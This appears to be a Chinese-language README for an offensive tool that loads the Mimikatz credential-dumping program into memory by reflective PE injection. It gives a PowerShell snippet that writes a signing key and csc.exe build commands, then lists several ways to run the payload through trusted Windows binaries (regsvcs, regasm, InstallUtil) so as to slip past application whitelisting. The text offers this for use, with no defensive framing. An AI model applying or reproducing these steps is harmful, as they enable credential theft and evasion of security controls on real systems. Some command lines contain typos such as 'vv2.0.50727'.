**原理**   
&nbsp;&nbsp;&nbsp;&nbsp;通过反射PE注入将mimikatz加载到内存运行。  
**如何更新代码中Mimikatz版本**   
&nbsp;&nbsp;&nbsp;&nbsp;先把mimikatz.exe或者其他文件转换成896行需要的编码格式，之后替换896行代码块就ok。具体如何转成需要的格式，在katz2.cs代码820行可以看到。  
**生成key.snk方式**  
&nbsp;&nbsp;&nbsp;&nbsp;不管编译exe还是dll，都需要先生成key.snk，
```
$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
$Content = [System.Convert]::FromBase64String($key)
Set-Content key.snk -Value $Content -Encoding Byte
```
**使用Csc编译多种文件格式并使用多种方式执行**   
**Csc编译成exe**  
&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz2.cs  
使用如下的方式运行  
&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe katz.exe   
x64  
&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regsvcs.exe katz.exe   
[OR]  
&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework\vv2.0.50727\regasm.exe katz.exe
&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe /U katz.exe 
&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe /U katz.exe
&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe /U katz.exe  
[OR]  
&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /U katz.exe
&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /U katz.exe  
**CscCsc编译成DLL**  
&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll
/r:System.IO.Compression.dll /target:library /out:regsvcs.dll /keyfile:key.snk /unsafe katz2.cs  
使用如下的方式运行  
&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe regsvcs.dll   
x64  
&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe regsvcs.dll   
[OR]  
&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe regsvcs.dll   
&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U regsvcs.dll   
&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U regsvcs.dll  
&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U regsvcs.dll  
